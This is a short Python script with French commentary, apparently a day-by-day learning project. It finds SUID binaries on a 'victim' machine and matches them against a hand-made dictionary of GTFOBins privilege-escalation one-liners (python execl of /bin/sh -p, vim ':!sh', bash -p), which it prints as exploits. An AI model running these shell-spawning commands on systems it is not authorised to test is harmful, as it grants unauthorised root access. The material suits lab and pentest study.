import subprocess
import re

gtfobins_suid = {
    "python": """./python -c 'import os; os.execl("/bin/sh", "sh", "-p")""",
    "vim": """vim -c ':!sh'""",
    "bash": """bash -p"""
}

def normalize_name(name: str) -> str:
    name = re.sub(r"\d+(\.\d+)*$", "", name)
    return name

print("[*] Recherche des binaires SUID...")
cmd = ["find", "/", "-perm", "-u=s", "-type", "f"]
result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
suid_bins = result.stdout.splitlines()

print("\n[+] Résultats bruts de find:")
for b in suid_bins:
    print(" ", b)

print("\n[*] Vérification locale GTFOBins:\n")
for binpath in suid_bins:
    raw_name = binpath.rsplit("/", 1)[-1]
    name = normalize_name(raw_name)

    if name in gtfobins_suid:
        print(f"[+] {binpath} (→ {name}) : Trouvé")
        print(f"    Exploit : {gtfobins_suid[name]}")
    else:
        print(f"[-] {binpath} (→ {name}) : Pas trouvé")


"""
Aujourd'hui, il s'agit d'améliorer/de résoudre le problème rencontré Jour 4. Comme nous ne pouvons
effectuer de requête sur la machine victime (pas de réseau pour ces machines), nous avons décidé 
de créer une base locale des outputs de gtfobins, puis de comparer les résultats de la commande de 
recherche de script avec la base de données. 
Il y a donc deux avantages à cela, le premier est donc la non nécessité de faire des requêtes en ligne,
ce qui améliore la rapidité d'exécution du script et supprime le besoin d'utiliser la libraie requests. 
Le deuxième avantage est le fait que nous n'ayons plus besoin de la logique de whitelist. En effet, nous 
l'avons implémenté principalement pour des raisons de rapidité d'exécution (exécuter 10 requêtes au lieu
de 20 est toujours une amélioration). 

Maintenant, il faut noter que notre base de donné est extremêment rudimentaire, et faite à la main. 
Nous allons pour la prochaine fois réfléchir à un script qui scrappe gtfobins coté suid et qui récupère toutes
les entrés. Nous en ferons un dictionnaire. 

Ah oui, et nous utilisons des """ """ dans le dictionnaire pour éviter des conflits de guillements. 
Les commandes gtfobins demandent souvent à la fois des '' et des "". 
"""